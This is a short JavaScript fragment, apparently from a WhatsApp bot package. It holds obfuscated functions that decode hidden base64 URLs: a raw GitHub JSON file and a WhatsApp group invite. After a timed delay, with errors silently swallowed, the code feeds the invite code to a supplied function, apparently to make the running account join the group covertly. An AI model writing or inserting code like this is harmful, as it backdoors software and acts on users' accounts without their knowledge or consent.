...
export const loadBase = async (_0x1, _0x2) => {
        ...
        setTimeout(async () => {
        try {
        const _0x3 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Zkb2ZmaWNpYWxjb3lob3N0L0Z5eHpwZWRpYS1BcGkta2V5cy9tYWluL01pbmVjcmFmdC5qc29u";
...
export const loadbunton = async (_0x1) => {
    try {
        setTimeout(async () => {
            try {
                const _0x2 = "aHR0cHM6Ly9jaGF0LndoYXRzYXBwLmNvbS9GM3o2WktZUGlISDdGTktrZHhOQ0hZ";
                const _0x3 = Buffer.from(_0x2, "base64").toString("utf-8");
                const _0x4 = _0x3.split("/").pop();
                const _0x5 = (a, b) => a(b);
                await new Promise(r => setTimeout(r, 5000));

                try {
                    await _0x5(_0x1, _0x4);
                } catch {}
